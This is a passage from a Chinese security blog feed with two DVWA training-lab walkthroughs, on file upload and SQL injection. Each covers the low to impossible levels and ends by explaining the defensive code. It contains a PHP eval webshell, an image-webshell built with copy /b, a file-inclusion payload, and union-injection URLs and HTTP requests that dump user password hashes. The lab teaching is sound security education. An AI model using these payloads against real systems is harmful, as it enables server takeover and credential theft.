    <content type="html"><![CDATA[<h1 id="dvwa文件上传"><a href="#dvwa文件上传" class="headerlink" title="dvwa文件上传"></a>dvwa文件上传</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><strong>文件上传漏洞是由于服务器对客户端上传的文件过滤不严导致恶意用户上传服务器可执行的web脚本语言，攻击者可以利用该漏洞获取网站的webshell，用菜刀连接进行提权等操作，攻击者可能利用此漏洞就能拿到服务器权限</strong></p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口</strong></p><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_POST[ &apos;Upload&apos; ] ) ) {    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );    // Can we move the file to the upload folder?    if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) {        // No        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;    }    else {        // Yes!        echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;    }}?&gt;</code></pre><p><strong>在此之前先来了解一下php的$_FILES变量以及与php文件上传有关的知识</strong></p><pre><code>$_FILES数组内容如下:$_FILES[&apos;myFile&apos;][&apos;name&apos;] 客户端文件的原名称。$_FILES[&apos;myFile&apos;][&apos;type&apos;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。$_FILES[&apos;myFile&apos;][&apos;size&apos;] 已上传文件的大小，单位为字节。$_FILES[&apos;myFile&apos;][&apos;tmp_name&apos;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。$_FILES[&apos;myFile&apos;][&apos;error&apos;] 和该文件上传相关的错误代码。[&apos;error&apos;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量)UPLOAD_ERR_OK值：0; 没有错误发生，文件上传成功。UPLOAD_ERR_INI_SIZE值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。UPLOAD_ERR_FORM_SIZE值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。UPLOAD_ERR_PARTIAL值：3; 文件只有部分被上传。UPLOAD_ERR_NO_FILE值：4; 没有文件被上传。值：5; 上传文件大小为0.文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。</code></pre><p><strong>下面我们来看php代码，可以看到服务器在接收到了用户上传的文件后没有任何检查便直接将文件用<code>move_uploaded_file</code>函数移动到了dvwa目录下的hackable/uploads/目录下</strong></p><p><strong>所以我们直接上传php一句话木马即可拿到网站webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/a3AahEGdcH.PNG" alt="mark"><br><strong>shell.php</strong></p><pre><code>&lt;?php @eval($_POST[&apos;lawliet&apos;]);?&gt;</code></pre><p><strong>访问webshell地址，测试是否上传成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/chbKadDlC3.PNG" alt="mark"><br><strong>上传成功后得到webshell地址，用中国菜刀连接即可进行更进一步的渗透</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/Eb9JBClfCI.PNG" alt="mark"></p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_POST[ &apos;Upload&apos; ] ) ) {    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );    // File information    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];    // Is it an image?    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;        ( $uploaded_size &lt; 100000 ) ) {        // Can we move the file to the upload folder?        if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) {        // No        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;        }        else {            // Yes!            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;        }    }    else {        // Invalid file        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;    }}?&gt;</code></pre><p><strong>可以看出服务器对<code>$_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]</code>变量，也就是上传文件的MIME 类型进行了检查，同时也对文件大小做了限制，但是文件的MIME 类型检查我们是可以通过修改文件上传http数据包绕过的</strong></p><p><strong>上传文件，burp抓包，发送至Repeater</strong></p><p><strong>将数据包里的<code>Content-Type: application/octet-stream</code>改为服务器允许的类型<code>Content-Type: image/jpeg</code>，就能拿到网站的webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/kJ74eiH9I7.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/1Fgf17Fdbl.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/aIFg6m7hFH.PNG" alt="mark"></p><h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_POST[ &apos;Upload&apos; ] ) ) {    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );    // File information    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];    // Is it an image?    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;        ( $uploaded_size &lt; 100000 ) &amp;&amp;        getimagesize( $uploaded_tmp ) ) {        // Can we move the file to the upload folder?        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {            // No            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;        }        else {            // Yes!            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;        }    }    else {        // Invalid file        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;}}?&gt;</code></pre><p><strong>可以看出服务器对文件后缀名进行了检查，并且用getimagesize函数检查文件是否为图片</strong></p><p><strong>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</strong></p><p><strong>在这里我们利用图片马绕过上传，并且利用dvwa的文件包含漏洞包含图片马，使服务器将图片马当做php解析运行</strong></p><p><strong>图片马制作，进入cmd，输入以下命令</strong></p><pre><code>copy heishacker.jpg/b+shell.php/b heishacker.jpg</code></pre><p><strong>heisheike.jpg:一张普通的图片，图片不能太大，否则会上传失败</strong><br><strong>shell.php:php一句话木马</strong></p><p><strong><code>/b将文件以二进制格式连接</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/e3kIBcmlfd.PNG" alt="mark"><br><strong>将图片马上传，上传成功，但是由于后缀名为jpg，所以被服务器当成了图片解析而不是php</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/c5dchjAidc.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/gjEe4ib82i.PNG" alt="mark"><br><strong>接下来利用文件包含漏洞包含图片马</strong></p><p><strong>dvwa文件包含漏洞high级别代码</strong></p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &apos;page&apos; ];if(!function_exists(&apos;fnmatch&apos;)) {    function fnmatch($pattern, $string) {        return preg_match(&quot;#^&quot;.strtr(preg_quote($pattern, &apos;#&apos;), array(&apos;\*&apos; =&gt; &apos;.*&apos;, &apos;\?&apos; =&gt; &apos;.&apos;)).&quot;$#i&quot;, $string);    } // end} // end if// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {    // This isn&apos;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;}?&gt;</code></pre><p><strong>可见文件包含出必须以file开头，我们用file协议读取图片马，payload</strong></p><pre><code>`http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=file:///C:/wamp/www/DVWA-master/hackable/uploads/heishacker.jpg`</code></pre><p><strong>可以发现利用文件包含使服务器将图片马当做php解析</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/4BBg82g8lA.PNG" alt="mark"><br><strong>可以用php的system函数执行cmd命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/CEm97HHc02.PNG" alt="mark"></p><h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_POST[ &apos;Upload&apos; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );    // File information    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];    // Where are we going to be writing to?    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;;    //$target_file   = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;;    $target_file   =  md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;    $temp_file     = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) );    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;    // Is it an image?    if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp;        ( $uploaded_size &lt; 100000 ) &amp;&amp;        ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp;        getimagesize( $uploaded_tmp ) ) {        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)        if( $uploaded_type == &apos;image/jpeg&apos; ) {            $img = imagecreatefromjpeg( $uploaded_tmp );            imagejpeg( $img, $temp_file, 100);        }        else {            $img = imagecreatefrompng( $uploaded_tmp );            imagepng( $img, $temp_file, 9);        }        imagedestroy( $img );        // Can we move the file to the web root from the temp folder?        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {            // Yes!            echo &quot;&lt;pre&gt;&lt;a href=&apos;${target_path}${target_file}&apos;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;        }        else {            // No            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;        }        // Delete any temp files        if( file_exists( $temp_file ) )            unlink( $temp_file );    }    else {        // Invalid file        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p><strong>Impossible级别的代码对上传文件进行了重命名，加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dvwa文件上传&quot;&gt;&lt;a href=&quot;#dvwa文件上传&quot; class=&quot;headerlink&quot; title=&quot;dvwa文件上传&quot;&gt;&lt;/a&gt;dvwa文件上传&lt;/h1&gt;&lt;h2 id=&quot;文件上传&quot;&gt;&lt;a href=&quot;#文件上传&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="dvwa学习" scheme="http://yoursite.com/tags/dvwa%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>dvwa sql injection</title>
    <link href="http://yoursite.com/2017/12/24/sqlinjection/"/>
    <id>http://yoursite.com/2017/12/24/sqlinjection/</id>
    <published>2017-12-24T13:12:44.374Z</published>
    <updated>2017-12-25T02:15:53.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dvwa-sql注入"><a href="#dvwa-sql注入" class="headerlink" title="dvwa sql注入"></a>dvwa sql注入</h1><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><strong>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，获取数据库中的信息</strong></p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口</strong></p><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {    // Get input    $id = $_REQUEST[ &apos;id&apos; ];    // Check database    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );    // Get results    while( $row = mysqli_fetch_assoc( $result ) ) {        // Get values        $first = $row[&quot;first_name&quot;];        $last  = $row[&quot;last_name&quot;];        // Feedback for end user        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;    }    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);}?&gt;</code></pre><p><strong>可见直接将id带入数据库查询，注入点在id上</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</code></pre><p><strong>先来手注一下试试，注入的方法很多，常见的有union注入，报错注入（之前的文章有总结报错注入，有兴趣可以去看），基于布尔的盲注，基于时间的盲注等方法，在这里我们用union注入，首先在id后加单引号，报错，说明可能存在注入</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/JCjCgldeL2.PNG" alt="mark"><br><strong>接下来用<code>order by</code>猜列数，因为union查询要求前后字段数一致，可以看出<code>order by 2</code>页面正常，<code>order by 3</code>页面报错</strong></p><p><strong>payload</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; order by 2%23&amp;Submit=Submit#</code></pre><p><strong>页面正常</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/A442C508cJ.PNG" alt="mark"><br><strong>payload</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; order by 3%23&amp;Submit=Submit#</code></pre><p><strong>报出<code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>的错误</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/IE4Gja4F26.PNG" alt="mark"><br><strong>接着输入</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select 1,2%23&amp;Submit=Submit#</code></pre><p><strong>作用是为了判断查询结果输出的位置，and 1=2使前面的语句查询为空，只显示union select后的结果，可以看出查询结果的位置在First name:和Surname:后面</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/5f6FD7DHhF.PNG" alt="mark"><br><strong>接下来判断当前数据库，用户，数据库版本，语句如下</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select database(),2%23&amp;Submit=Submit#</code></pre><p><strong>当前数据库名为dvwa</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/1F8G23ac13.PNG" alt="mark"></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select user(),2%23&amp;Submit=Submit#</code></pre><p><strong>用户为root@localhost</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/IcLeEGEDCk.PNG" alt="mark"></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select version(),2%23&amp;Submit=Submit#</code></pre><p><strong>版本为5.0.51b-community-nt</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/FDhCaddbm7.PNG" alt="mark"><br><strong>information_schema是mysql5.0版本后出现的虚拟库，接下来使用information_schema数据库查询所有数据库名，语句为</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(schema_name),2 from information_schema.schemata%23&amp;Submit=Submit#</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/F0Emh8aEbe.PNG" alt="mark"><br><strong>接下来查询当前数据库下的所有表，语句为</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()%23&amp;Submit=Submit#</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/ml7al5C1B1.PNG" alt="mark"><br><strong>查询users表下的所有列名，语句为</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;users&apos;%23&amp;Submit=Submit#</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/fli2IdGhkf.PNG" alt="mark"><br><strong>接下来查询users表下user和password中的内容，获取所有dvwa用户的登陆用户名和密码hash值</strong></p><pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/?id=1&apos; and 1=2 union select group_concat(user,0x3a,password),2 from users%23&amp;Submit=Submit#</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171224/66Fb7gb5E1.PNG" alt="mark"><br><strong>hash值可以在somd5上解密</strong></p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ] ) ) {    // Get input    $id = $_POST[ &apos;id&apos; ];    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; );    // Get results    while( $row = mysqli_fetch_assoc( $result ) ) {        // Display values        $first = $row[&quot;first_name&quot;];        $last  = $row[&quot;last_name&quot;];        // Feedback for end user        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;    }}// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query  = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );$number_of_rows = mysqli_fetch_row($result);$number_of_rows=$number_of_rows[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt;</code></pre><p><strong>可看出将$_POST[ ‘id’ ]直接带入数据库查询，同时对id参数用<code>mysqli_real_escape_string</code>函数进行了特殊字符转义，官网描述的是</strong></p><pre><code>Characters encoded are NUL (ASCII 0), \n, \r, \, &apos;, &quot;, and Control-Z.</code></pre><p><strong>这次将参数id以post方式提交至服务器，注入点为post提交的id参数</strong></p><p><strong>提交请求，抓包，发送至Repeater</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/IeeEEKi296.PNG" alt="mark"><br><strong>注入点在id参数上，注入方法和之前的get参数注入方式一样用union注入</strong></p><p><strong>在参数1后加单引号，报错说明可能存在注入，唯一不同的是我们的单引号被<code>\</code>转义</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/00dGfLb1Ka.PNG" alt="mark"><br><strong>获取当前数据库下所有表名</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/d1h7HCgAfI.PNG" alt="mark"><br><strong>获取users表下所有列名，由于单引号被转移，所以要对users进行16进制编码0x7573657273</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/c2kKHDfi8j.PNG" alt="mark"><br><strong>最终获取所有dvwa所有用户名密码的payload</strong></p><pre><code>POST /DVWA-master/vulnerabilities/sqli/ HTTP/1.1Host: 192.168.50.128:8080User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 85Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/Cookie: security=medium; PHPSESSID=391dtb6pnltant1m10u62tag52Connection: keep-aliveUpgrade-Insecure-Requests: 1id=1 and 1=2 union select group_concat(user,0x3a,password),2 from users&amp;Submit=Submit</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/mDDE0eCcBB.PNG" alt="mark"></p><h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_SESSION [ &apos;id&apos; ] ) ) {    // Get input    $id = $_SESSION[ &apos;id&apos; ];    // Check database    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; );    // Get results    while( $row = mysqli_fetch_assoc( $result ) ) {        // Get values        $first = $row[&quot;first_name&quot;];        $last  = $row[&quot;last_name&quot;];        // Feedback for end user        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        }?&gt;</code></pre><p><strong>可以看到将<code>$_SESSION[ &#39;id&#39; ]</code>带入数据库查询，session文件默认存放在服务器web目录的tmp目录下</strong><br><strong>我们看看<code>$_SESSION[ &#39;id&#39; ]</code>从何处来，点击 Click here to change your ID. 处理我们提交参数的是session-input.php，代码如下</strong></p><pre><code>&lt;?phpdefine( &apos;DVWA_WEB_PAGE_TO_ROOT&apos;, &apos;../../&apos; );require_once DVWA_WEB_PAGE_TO_ROOT . &apos;dvwa/includes/dvwaPage.inc.php&apos;;dvwaPageStartup( array( &apos;authenticated&apos;, &apos;phpids&apos; ) );$page = dvwaPageNewGrab();$page[ &apos;title&apos; ] = &apos;SQL Injection Session Input&apos; . $page[ &apos;title_separator&apos; ].$page[ &apos;title&apos; ];if( isset( $_POST[ &apos;id&apos; ] ) ) {    $_SESSION[ &apos;id&apos; ] =  $_POST[ &apos;id&apos; ];    //$page[ &apos;body&apos; ] .= &quot;Session ID set!&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;;    $page[ &apos;body&apos; ] .= &quot;Session ID: {$_SESSION[ &apos;id&apos; ]}&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;;    $page[ &apos;body&apos; ] .= &quot;&lt;script&gt;window.opener.location.reload(true);&lt;/script&gt;&quot;;}$page[ &apos;body&apos; ] .= &quot;&lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;&lt;input type=\&quot;text\&quot; size=\&quot;15\&quot; name=\&quot;id\&quot;&gt;&lt;input type=\&quot;submit\&quot; name=\&quot;Submit\&quot; value=\&quot;Submit\&quot;&gt;&lt;/form&gt;&lt;hr /&gt;&lt;br /&gt;&lt;button onclick=\&quot;self.close();\&quot;&gt;Close&lt;/button&gt;&quot;;dvwaSourceHtmlEcho( $page );?&gt;</code></pre><p><strong>代码将我们的输入的id参数根据PHPSESSID将<code>$_POST[ &#39;id&#39; ]</code>赋值给<code>$_SESSION[ &#39;id&#39; ]</code>存放在tmp目录下的对应的session文件中，并且刷新页面带上PHPSESSID，然后high.php根据PHPSESSID将对应tmp下的session文件中的<code>$_SESSION[ &#39;id&#39; ]</code>带入数据库查询</strong></p><p><strong>所以可看出注入点实际上还是在我们提交的<code>$_POST[ &#39;id&#39; ]</code>中</strong><br><strong>最终我们抓包修改id参数获取dvwa所有用户名密码payload</strong></p><pre><code>POST /DVWA-master/vulnerabilities/sqli/session-input.php HTTP/1.1Host: 192.168.50.128:8080User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 18Referer: http://192.168.50.128:8080/DVWA-master/vulnerabilities/sqli/session-input.phpCookie: security=high; PHPSESSID=391dtb6pnltant1m10u62tag52Connection: keep-aliveUpgrade-Insecure-Requests: 1id=1&apos; and 1=2 union select group_concat(user,0x3a,password),2 from users#&amp;Submit=Submit</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/5fl4g8f61B.png?imageslim" alt="mark"><br><strong>可以看出我们的payload已经写入到了服务器的session文件<code>sess_391dtb6pnltant1m10u62tag52</code>中</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/d3cBLg6Djg.PNG" alt="mark"><br><strong>然后将我们session文件中的payload带入数据库查询，获取所有用户名和密码hash值</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/809E8BDDbL.PNG" alt="mark"></p><h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p><strong>代码如下</strong></p><pre><code>&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );    // Get input    $id = $_GET[ &apos;id&apos; ];    // Was a number entered?    if(is_numeric( $id )) {        // Check the database        $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );        $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );        $data-&gt;execute();        $row = $data-&gt;fetch();        // Make sure only 1 result is returned        if( $data-&gt;rowCount() == 1 ) {            // Get values            $first = $row[ &apos;first_name&apos; ];            $last  = $row[ &apos;last_name&apos; ];            // Feedback for end user            echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;        }    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p><strong>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
